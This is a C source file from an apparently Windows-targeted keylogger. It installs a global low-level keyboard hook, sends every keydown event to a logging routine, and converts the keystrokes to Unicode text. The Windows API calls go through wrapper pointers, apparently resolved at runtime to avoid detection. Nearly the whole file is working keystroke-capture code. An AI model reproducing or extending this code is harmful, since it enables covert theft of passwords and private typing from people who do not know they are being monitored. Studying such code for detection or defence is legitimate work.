#include "constants.h"
#include "keyboard.h"
#include "keylogger.h"

/* The hook variable shared between the setter and the callback. */
HHOOK hook;

/*
 * hook_callback - The callback that is fired every time a new keyboard input
 * event is about to be posted into a thread input queue.
 * @code: A code the hook procedure uses to determine how to process the
 * message.
 * @wparam: The identifier of the keyboard message.
 * @lparam: A pointer to a KBDLLHOOKSTRUCT structure.
 *
 * Returns the hook procedure code.
 */
LRESULT WINAPI hook_callback(const int code, const WPARAM wparam,
			     const LPARAM lparam)
{
	/*
	 * If an action occurred and the keydown event was fired, log the
	 * respective characters of the KBD hook.
	 */
	if (code == HC_ACTION && wparam == WM_KEYDOWN)
		log_kbd((KBDLLHOOKSTRUCT*)lparam);

	return LpCallNextHookEx(hook, code, wparam, lparam);
}

BOOL set_keyboard_hook(VOID)
{
	hook = LpSetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);

	return hook != NULL;
}

void get_keyboard_state(BYTE *const buff, const SIZE_T size)
{
	for (SIZE_T i = 0; i < size; i++) {
		const SHORT key_state = LpGetKeyState(i);

		/*
		 * Right shifts the high order bit by 8 to avoid a narrowing
		 * conversion from SHORT to BYTE.
		 */
		buff[i] = (key_state >> 8) | (key_state & 1);
	}
}

BOOL is_key_down(const DWORD vk_code)
{
	/*
	 * Right shifts the high order bit by 15 to obtain the virtual key's
	 * up/down status.
	 */
	return LpGetKeyState(vk_code) >> 15;
}

int kbd_to_unicode(const KBDLLHOOKSTRUCT *const kbd_hook, const LPWSTR buff,
		   const size_t size)
{
	BYTE state[KEYBOARD_STATE_SIZE];
	get_keyboard_state(state, KEYBOARD_STATE_SIZE);

	return LpToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, buff,
			 size, 0);
}
